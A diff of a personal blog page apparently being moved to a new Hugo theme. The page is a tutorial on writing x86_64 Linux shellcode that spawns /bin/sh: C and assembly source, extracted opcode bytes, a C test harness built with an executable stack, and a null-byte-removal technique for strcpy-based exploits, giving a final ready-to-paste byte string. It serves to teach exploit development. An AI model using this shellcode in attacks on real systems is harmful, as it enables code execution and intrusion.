@@ -1,185 +1,175 @@
 <!DOCTYPE html>
-<html lang="en-us">
-    <head>
-        
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-149344965-1"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+<html lang="en">
 
-  gtag('config', 'UA-149344965-1');
-</script>
-
-         
-        <meta charset="utf-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1">
-        <meta name="google-site-verification" content="x8Iv_Db6KOOx4mL-b2Ink56M14U_RsqmDiyYHZU8nR8" />
-        <title>Write your shellcode</title>
-        
-        <style>
-
-    html body {
-        font-family: 'Oxygen', sans-serif;
-        background-color: white;
-    }
-
-    :root {
-        --accent: red;
-        --border-width:  0 ;
-    }
-
-</style>
-
-
-<link rel="stylesheet" href="https://masterccc.github.io/css/main.css">
+<head>
+  <title>
+  Write your shellcode · Master 0xCcC
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
 
 
 
 
+<meta name="author" content="Masterccc">
+<meta name="description" content="This memo describe how to write (and test) a shellcode from the corresponding C code.
+x86_64 Shellcode Link to heading The shellcode will start /bin/sh. Let&rsquo;s take the following C code :
+#include &lt;unistd.h&gt; int main(void){ execve(&#34;/bin/sh&#34;, NULL, NULL); } NULL parameters stands for args and environment, we don&rsquo;t need them for now.
+It can be translated in assembly this way :
+global _start SECTION .text _start: xor rdx,rdx ; env xor rsi,rsi ; args mov rax, 0x68732f6e69622f ; &#34;/bin/sh&#34; push rax mov rdi,rsp mov rax, 0x3b ; sys_execve (59) syscall ; Quit mov rbx,0 ; return code mov rax,1 ; exit syscall number int 0x80 ; syscall Explanation of the assembly code Link to heading Similar to C code, execve syscall takes 3 args.">
+<meta name="keywords" content="blog,developer,personal">
 
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Oxygen">
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Write your shellcode"/>
+<meta name="twitter:description" content="This memo describe how to write (and test) a shellcode from the corresponding C code.
+x86_64 Shellcode Link to heading The shellcode will start /bin/sh. Let&rsquo;s take the following C code :
+#include &lt;unistd.h&gt; int main(void){ execve(&#34;/bin/sh&#34;, NULL, NULL); } NULL parameters stands for args and environment, we don&rsquo;t need them for now.
+It can be translated in assembly this way :
+global _start SECTION .text _start: xor rdx,rdx ; env xor rsi,rsi ; args mov rax, 0x68732f6e69622f ; &#34;/bin/sh&#34; push rax mov rdi,rsp mov rax, 0x3b ; sys_execve (59) syscall ; Quit mov rbx,0 ; return code mov rax,1 ; exit syscall number int 0x80 ; syscall Explanation of the assembly code Link to heading Similar to C code, execve syscall takes 3 args."/>
+
+<meta property="og:title" content="Write your shellcode" />
+<meta property="og:description" content="This memo describe how to write (and test) a shellcode from the corresponding C code.
+x86_64 Shellcode Link to heading The shellcode will start /bin/sh. Let&rsquo;s take the following C code :
+#include &lt;unistd.h&gt; int main(void){ execve(&#34;/bin/sh&#34;, NULL, NULL); } NULL parameters stands for args and environment, we don&rsquo;t need them for now.
+It can be translated in assembly this way :
+global _start SECTION .text _start: xor rdx,rdx ; env xor rsi,rsi ; args mov rax, 0x68732f6e69622f ; &#34;/bin/sh&#34; push rax mov rdi,rsp mov rax, 0x3b ; sys_execve (59) syscall ; Quit mov rbx,0 ; return code mov rax,1 ; exit syscall number int 0x80 ; syscall Explanation of the assembly code Link to heading Similar to C code, execve syscall takes 3 args." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://masterccc.github.io/memo/shellcode/" /><meta property="article:section" content="memo" />
+<meta property="article:published_time" content="2019-10-02T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-10-02T00:00:00+00:00" />
 
 
- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/atom-one-light.min.css"> 
 
 
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+<link rel="canonical" href="https://masterccc.github.io/memo/shellcode/">
 
 
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+<link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.c2a5cdc31d8aead6f14b48bf843558ba7b5ee65d239ea3d1c1f28728f6b13d82.css" integrity="sha256-wqXNwx2K6tbxS0i/hDVYunte5l0jnqPRwfKHKPaxPYI=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.f6534b0b446b75d9b6ad77a97d43ede2ddaeff1b6e2361fb7198d6f8fcb7f83f.css" integrity="sha256-9lNLC0Rrddm2rXepfUPt4t2u/xtuI2H7cZjW&#43;Py3&#43;D8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
  
 
 
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
-
-     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/python.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/c.min.js"></script>  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/languages/sh.min.js"></script> 
-
-    <script>hljs.initHighlightingOnLoad();</script>
 
 
+<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
 
 
 
 
 
-<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
 
 
-<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
 
 
-<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
- <meta name="generator" content="Hugo 0.60.1" />
-        
-
-        
-    </head>
-
-    
-    
-    <script type="text/javascript" async
-      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
-    </script>
-    
-
-    <body>
-         
-        <nav class="navbar navbar-default navbar-fixed-top">
-
-            <div class="container">
-
-                <div class="navbar-header">
-
-                    <a class="navbar-brand visible-xs" href="#">Write your shellcode</a>
-
-                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
-                        <span class="icon-bar"></span>
-                        <span class="icon-bar"></span>
-                        <span class="icon-bar"></span>
-                    </button>
-
-                </div>
-
-                <div class="collapse navbar-collapse">
-
-                    
-                        <ul class="nav navbar-nav">
-                            
-                                <li><a href="/">Home</a></li>
-                            
-                                <li><a href="/reverse/">Reverse</a></li>
-                            
-                                <li><a href="/realist/">Realist</a></li>
-                            
-                                <li><a href="/memo/">Memo</a></li>
-                            
-                                <li><a href="/tools/">Tools</a></li>
-                            
-                        </ul>
-                    
-
-                    
-                        <ul class="nav navbar-nav navbar-right">
-                            
-                                <li class="navbar-icon"><a href="https://github.com/masterccc/"><i class="fa fa-github"></i></a></li>
-                            
-                        </ul>
-                    
-
-                </div>
-
-            </div>
-
-        </nav>
+</head>
 
 
-<main>
-
-    <div class="item">
-
-    
-    
-    
-
-    
-    
-
-    <div>
-        <a class="itemtitle" href="/memo/shellcode/">Write your shellcode</a>
-        <span class="itemdate">October 2, 2019</span>
-    </div>
 
 
-    
-    <a href="https://masterccc.github.io/tags/shellcode"><kbd class="item-tag">shellcode</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/assembly"><kbd class="item-tag">assembly</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/x86_64"><kbd class="item-tag">x86_64</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/linux"><kbd class="item-tag">linux</kbd></a>
-    
-    <a href="https://masterccc.github.io/tags/exploit"><kbd class="item-tag">exploit</kbd></a>
-    
 
+
+<body class="preload-transitions colorscheme-dark">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
 </div>
 
 
-    <br> <div class="text-justify"><p>This memo explains the required steps to write you own shellcode. From C code (or assembly directly) to the shellcode's string. At the bottom of this page a code is present to test your shellcode.</p>
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      Master 0xCcC
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/">Home</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/reverse/">Reverse</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/memo/">Memo</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tools/">Tools</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
 
-<h1 id="x8664-shellcode">x86_64 Shellcode</h1>
 
-<p>In this memo, the shellcode will launch /bin/sh. Let's take the following C code :</p>
-<pre><code>#include <unistd.h>
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="https://masterccc.github.io/memo/shellcode/">
+          Write your shellcode
+        </a>
+      </h1>
+    </header>
+
+    <p>This memo describe how to write (and test) a shellcode from the corresponding C code.</p>
+<h1 id="x86_64-shellcode">
+  x86_64 Shellcode
+  <a class="heading-link" href="#x86_64-shellcode">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>The shellcode will start /bin/sh. Let&rsquo;s take the following C code :</p>
+<pre tabindex="0"><code>#include &lt;unistd.h&gt;
 
 int main(void){
-  execve("/bin/sh", NULL, NULL);  
-}</code></pre>
-<p><code>NULL</code> parameters stands for args and environment, we don't need them for now.</p>
-
+  execve(&#34;/bin/sh&#34;, NULL, NULL);  
+}
+</code></pre><p><code>NULL</code> parameters stands for args and environment, we don&rsquo;t need them for now.</p>
 <p>It can be translated in assembly this way :</p>
-<pre><code>global _start
+<pre tabindex="0"><code>global _start
 
 SECTION .text
 
@@ -187,7 +177,7 @@ _start:
 
   xor rdx,rdx ; env
   xor rsi,rsi ; args
-  mov rax, 0x68732f6e69622f ; "/bin/sh"
+  mov rax, 0x68732f6e69622f ; &#34;/bin/sh&#34;
   push rax
   mov rdi,rsp
   mov rax, 0x3b ; sys_execve (59)
@@ -196,78 +186,82 @@ _start:
 ; Quit
   mov  rbx,0       ; return code
   mov  rax,1       ; exit syscall number
-  int  0x80        ; syscall</code></pre>
-<h2 id="explanation-of-the-assembly-code">Explanation of the assembly code</h2>
-
-<p>Similarly to the C code, the execve syscall will take 3 args. Here we don't use the execve() C function but directly the syscall which takes the following parameters :</p>
-
-<table class="pure-table table table-responsive table-striped">
+  int  0x80        ; syscall
+</code></pre><h2 id="explanation-of-the-assembly-code">
+  Explanation of the assembly code
+  <a class="heading-link" href="#explanation-of-the-assembly-code">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Similar to C code, execve syscall takes 3 args. Here we don&rsquo;t use the C function execve(), but directly the syscall, which takes the following parameters:</p>
+<p>{.table .pure-table .table-striped .table-responsive}</p>
+<table>
 <thead>
 <tr>
 <th>Register</th>
 <th>Value</th>
 </tr>
 </thead>
-
 <tbody>
 <tr>
 <td><code>rdi</code></td>
 <td>File name to execute</td>
 </tr>
-
 <tr>
 <td><code>rsi</code></td>
 <td>args</td>
 </tr>
-
 <tr>
 <td><code>rdx</code></td>
 <td>env</td>
 </tr>
 </tbody>
 </table>
-
-<p>(see: <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a> for details)</p>
-
+<p>(see: <a href="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/"  class="external-link" target="_blank" rel="noopener">https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</a> for details)</p>
 <p>Both of them are NULL, they are set to zero :</p>
-<pre><code>xor rdx,rdx ; env
-xor rsi,rsi ; args</code></pre>
-<p>Conversely to the C code, in the shellcode we can't store strings in the data section, we have to put them in the stack.</p>
-
+<pre tabindex="0"><code>xor rdx,rdx ; env
+xor rsi,rsi ; args
+</code></pre><p>Unlike C, shellcode can&rsquo;t store strings in the data section, we have to put them on the stack.</p>
 <ul>
-<li>Put the string in a register</li>
-<li>Push the valeu of the register on the stack</li>
-<li>The adress of the string is the current value of RSP (top of the stack)</li>
+<li>Put the string into a register</li>
+<li>Push the value of the register on the stack</li>
+<li>The string address is the current value of RSP (top of stack).</li>
 </ul>
-<pre><code>mov rax, 0x68732f6e69622f ; "/bin/sh" ( "hs/nib/")
+<pre tabindex="0"><code>mov rax, 0x68732f6e69622f ; &#34;/bin/sh&#34; ( &#34;hs/nib/&#34;)
 push rax
-mov rdi,rsp</code></pre>
-<p>Finally execute the syscall :</p>
-<pre><code>mov rax, 0x3b ; sys_execve (59)
-syscall</code></pre>
-<p>Compilation :</p>
-<pre><code>$ nasm -felf64 -o shell.o shell.asm 
-$ ld -o shell shell.o </code></pre>
-<p>We can now extract assembly instructions from objdump (or any other disassembler) :</p>
-<pre><code>$ objdump -d -Mintel shell</code></pre>
-<p>The interesting part is :</p>
-<pre><code>  401000: 48 31 d2              xor    rdx,rdx
+mov rdi,rsp
+</code></pre><p>Finally execute the syscall :</p>
+<pre tabindex="0"><code>mov rax, 0x3b ; sys_execve (59)
+syscall
+</code></pre><p>Compilation :</p>
+<pre tabindex="0"><code>$ nasm -felf64 -o shell.o shell.asm 
+$ ld -o shell shell.o 
+</code></pre><p>We are now able to extract the assembly instructions from objdump (or any other disassembler):</p>
+<pre tabindex="0"><code>$ objdump -d -Mintel shell
+</code></pre><p>The interesting part is :</p>
+<pre tabindex="0"><code>  401000: 48 31 d2              xor    rdx,rdx
   401003: 48 31 f6              xor    rsi,rsi
   401006: 48 b8 2f 62 69 6e 2f  movabs rax,0x68732f6e69622f
   40100d: 73 68 00 
   401010: 50                    push   rax
   401011: 48 89 e7              mov    rdi,rsp
   401014: b8 3b 00 00 00        mov    eax,0x3b
-  401019: 0f 05                 syscall</code></pre>
-<p>The instructions are :</p>
-<pre><code>48 31 d2 48 31 f6 48 b8 2f 62 69 6e 2f 73 68 00 50 48 89 e7 b8 3b 00 00 00 0f 05</code></pre>
-<h1 id="test-the-shellcode">Test the shellcode</h1>
+  401019: 0f 05                 syscall
+</code></pre><p>The instructions are :</p>
+<pre tabindex="0"><code>48 31 d2 48 31 f6 48 b8 2f 62 69 6e 2f 73 68 00 50 48 89 e7 b8 3b 00 00 00 0f 05
+</code></pre><h1 id="test-the-shellcode">
+  Test the shellcode
+  <a class="heading-link" href="#test-the-shellcode">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>With a little C program, we can test this shellcode:</p>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
 
-<p>We can test this shellcode with a little C program :</p>
-<pre><code>#include <stdio.h>
-#include <string.h>
-
-char code[] = "\x48\x31\xd2\x48\x31\xf6\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05";
+char code[] = &#34;\x48\x31\xd2\x48\x31\xf6\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x50\x48\x89\xe7\xb8\x3b\x00\x00\x00\x0f\x05&#34;;
 
 /* Could also be written : char code[] = { 0x48, 0x31 ....} */
 
@@ -275,62 +269,67 @@ int main()
 {
     (*(void(*)()) code)();
     return 0;
-}</code></pre>
-<p>Compilation :</p>
-
+}
+</code></pre><p>Compilation :</p>
 <p><code>gcc -o shelltest shelltest.c -z execstack</code></p>
-
 <p><code>-z execstack</code> is needed because by default gcc make the stack non-executable, we can check this fact with readelf :</p>
-<pre><code>$ gcc -o shelltest shelltest.c
+<pre tabindex="0"><code>$ gcc -o shelltest shelltest.c
 $ readelf -a ar | grep STACK -A 1
   GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                  0x0000000000000000 0x0000000000000000  RW     0x10
 $ ./shelltest
-Erreur de segmentation (core dumped)</code></pre>
-<p><code>RWE</code> for read/write/EXECUTE</p>
-<pre><code>$ gcc -o shelltest shelltest.c -z execstack
+Erreur de segmentation (core dumped)
+</code></pre><p><code>RWE</code> for read/write/EXECUTE</p>
+<pre tabindex="0"><code>$ gcc -o shelltest shelltest.c -z execstack
 $ readelf -a shelltest | grep STACK -A 1
   GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
-                 0x0000000000000000 0x0000000000000000  RWE    0x10</code></pre>
-<p><code>RW</code> Only</p>
-
+                 0x0000000000000000 0x0000000000000000  RWE    0x10
+</code></pre><p><code>RW</code> Only</p>
 <p>You have now a working shellcode.</p>
-
-<h1 id="polymorphism">Polymorphism</h1>
-
+<h1 id="polymorphism">
+  Polymorphism
+  <a class="heading-link" href="#polymorphism">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
 <p><em>In computer terminology, polymorphic code is code that uses a polymorphic engine to mutate while keeping the original algorithm intact. That is, the code changes itself each time it runs, but the function of the code (its semantics) will not change at all. For example, 1+3 and 6-2 both achieve the same result while using different values and operations. This technique is sometimes used by computer viruses, shellcodes and computer worms to hide their presence.</em></p>
-
-<p><a href="https://en.wikipedia.org/wiki/Polymorphic_code">https://en.wikipedia.org/wiki/Polymorphic_code</a></p>
-
-<h2 id="the-problem">The problem</h2>
-
-<p>In some cases, we can't use <code>\x00</code> in shellcode because they are processed by strings's functions (like strcpy which stops reading at the first <code>\x00</code> encountered). Sometime somes bytes are forbidden in CTF exercises. We need to remove them.</p>
-
-<p>In order to remove them, we have to manipulate the assembly code, change opcodes with others, remove some, add some, here is an example.</p>
-
-<h2 id="example">Example</h2>
-
-<p>These are the shellcode bytes from the first part, it does contain zeros and will not be processed correctly by a <code>strcpy</code>.</p>
-<pre><code>48 31 d2 48 31 f6 48 b8 2f 62 69 6e 2f 73 68 00 50 48 89 e7 b8 3b 00 00 00 0f 05</code></pre>
-<p>The first <code>\x00</code> is here at the end of the string :</p>
-<pre><code>  401006: 48 b8 2f 62 69 6e 2f  movabs rax,0x68732f6e69622f
-  40100d: 73 68 00 </code></pre>
-<p>We need the null byte to finish the string. One way we can use is to inverse the content of rax and then re-inverse it in the assembly code :</p>
-
+<p><a href="https://en.wikipedia.org/wiki/Polymorphic_code"  class="external-link" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Polymorphic_code</a></p>
+<h2 id="why-do-i-need-polymorphism-">
+  Why do i need polymorphism ?
+  <a class="heading-link" href="#why-do-i-need-polymorphism-">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>In some cases, we can&rsquo;t use <code>\x00</code> in shellcode because they are processed by strings related functions (like strcpy, which stops reading at the first <code>\x00</code> it encounters). Sometimes some bytes are forbidden in CTF exercises, we need to get rid of these.</p>
+<p>To remove unwanted bytes, we have to manipulate the assembly code, replace opcodes with others, remove some, add some. Here is an example.</p>
+<h2 id="example">
+  Example
+  <a class="heading-link" href="#example">
+    <i class="fa fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>Take the shellcode from the first part of this article, it contains zeros and will not be processed correctly by a string related function.</p>
+<pre tabindex="0"><code>48 31 d2 48 31 f6 48 b8 2f 62 69 6e 2f 73 68 00 50 48 89 e7 b8 3b 00 00 00 0f 05
+</code></pre><p>The first <code>\x00</code> is here at the end of the string :</p>
+<pre tabindex="0"><code>
+  401006: 48 b8 2f 62 69 6e 2f  movabs rax,0x68732f6e69622f
+  40100d: 73 68 00 
+</code></pre><p>We need the null byte to terminate the string. One way we can do this is by inverting the contents of rax and then re-inverting it in the assembly code:</p>
 <p>Current RAX is <code>0x68732f6e69622f</code></p>
-
 <p>If we apply the neg operation, it becomes <code>0xff978cd091969dd1</code></p>
-<pre><code>...
+<pre tabindex="0"><code>...
 mov rax, 0x68732f6e69622f
 neg rax
-<breakpoint here>
+&lt;breakpoint here&gt;
 ...
 (gdb) info registers
-rax            0xff978cd091969dd1  -29400045130965551</code></pre>
-<p>No more zero in <code>0xff978cd091969dd1</code></p>
-
+rax            0xff978cd091969dd1  -29400045130965551
+</code></pre><p>No more zero in <code>0xff978cd091969dd1</code></p>
 <p>New shellcode :</p>
-<pre><code>  401000: 48 31 d2              xor    rdx,rdx
+<pre tabindex="0"><code>  401000: 48 31 d2              xor    rdx,rdx
   401003: 48 31 f6              xor    rsi,rsi
   401006: 48 b8 d1 9d 96 91 d0  movabs rax,0xff978cd091969dd1
   40100d: 8c 97 ff 
@@ -338,16 +337,13 @@ rax            0xff978cd091969dd1  -29400045130965551</code></pre>
   401013: 50                    push   rax
   401014: 48 89 e7              mov    rdi,rsp
   401017: b8 3b 00 00 00        mov    eax,0x3b
-  40101c: 0f 05                 syscall</code></pre>
-<p>There are still zeros in the <code>mov    eax,0x3b</code> operation.</p>
-
-<p>Instead of using mov, we can use other opcodes, for exemple :</p>
-
+  40101c: 0f 05                 syscall
+</code></pre><p>There are still zeros in the <code>mov    eax,0x3b</code> operation.</p>
+<p>Instead of using mov, we can use other opcodes :</p>
 <p>Set rax to zero <code>xor rax,rax</code> then adding 0x3b (syscall number)
 <code>add rax,0x3b</code></p>
-
-<p>Let's check the final code :</p>
-<pre><code>0000000000401000 <_start>:
+<p>Let&rsquo;s check the final code :</p>
+<pre tabindex="0"><code>0000000000401000 &lt;_start&gt;:
   401000: 48 31 d2              xor    rdx,rdx
   401003: 48 31 f6              xor    rsi,rsi
   401006: 48 b8 d1 9d 96 91 d0  movabs rax,0xff978cd091969dd1
@@ -357,30 +353,73 @@ rax            0xff978cd091969dd1  -29400045130965551</code></pre>
   401014: 48 89 e7              mov    rdi,rsp
   401017: 48 31 c0              xor    rax,rax
   40101a: 48 83 c0 3b           add    rax,0x3b
-  40101e: 0f 05                 syscall</code></pre>
-<p><code>48 31 d2 48 31 f6 48 b8 d1 9d 96 91 d0 8c 97 ff 48 f7 d8 50 48 89 e7 48 31 c0 48 83 c0 3b 0f 05</code></p>
+  40101e: 0f 05                 syscall
+</code></pre><p><code>48 31 d2 48 31 f6 48 b8 d1 9d 96 91 d0 8c 97 ff 48 f7 d8 50 48 89 e7 48 31 c0 48 83 c0 3b 0f 05</code></p>
+<p>It&rsquo;s done, no more zeros! You can use similar methods (and create your own) to remove all the unwanted bytes. At this point, the better you know assembly language, the easier you&rsquo;ll be able to create your shellcode and use polyporphism.</p>
+<p>Here&rsquo;s the python-usable version :</p>
+<pre tabindex="0"><code>\x48\x31\xd2\x48\x31\xf6\x48\xb8\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd8\x50\x48\x89\xe7\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05
+</code></pre>
+  </article>
+</section>
 
-<p>It's done, no more zeros ! You can use similar methods (and create you own) to remove all unwanted bytes. At this point, better is you assembly knowledge easier and faster you'll create your shellcodes.</p>
+  
 
-<p>Here's the python-usable version :</p>
-<pre><code>\x48\x31\xd2\x48\x31\xf6\x48\xb8\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xd8\x50\x48\x89\xe7\x48\x31\xc0\x48\x83\xc0\x3b\x0f\x05</code></pre></div>
+    </div>
 
+    <footer class="footer">
+  <section class="container">
+    ©
     
+      2019 -
     
-
+    2023
+     Masterccc 
+    ·
     
-
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
     
+  </section>
+</footer>
 
-</main>
+  </main>
 
-        <footer>
+  
 
-            <p class="copyright text-muted">© All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a></p>
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
 
-        </footer>
-       
-    </body>
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
 
 </html>
-
